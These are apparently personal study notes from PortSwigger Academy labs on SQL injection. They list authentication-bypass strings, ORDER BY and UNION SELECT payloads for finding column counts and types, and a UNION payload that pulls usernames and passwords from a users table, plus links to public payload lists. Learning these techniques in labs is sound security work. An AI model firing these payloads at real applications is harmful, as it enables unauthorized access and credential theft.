# burpSuite
aka Notes from PortSwigger Academy

## SQLi

- ```--``` comments out everything after
- ```+``` URL encoding for simple space 
- ```%20``` Same as above ... URL encoding for simple space 
- ```%27``` means this bad boy ```'```

Payloads that just worked somewhere:
```
'--
admin'--
administrator'-- 
' OR 1=1 -- 
OR 1=1 -- 
```
So how many collumns do we have? 
```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 

' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 

' UNION SELECT NULL-- 
' UNION SELECT NULL, NULL-- 
' UNION SELECT NULL, NULL, NULL-- 

' UNION SELECT NULL FROM DUAL-- 
' UNION SELECT NULL, NULL FROM DUAL-- 
' UNION SELECT NULL, NULL, NULL FROM DUAL-- 


' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 

' UNION SELECT username, password FROM users-- 
```
- The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment. 

- [payloads](https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads)
- [payloads2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
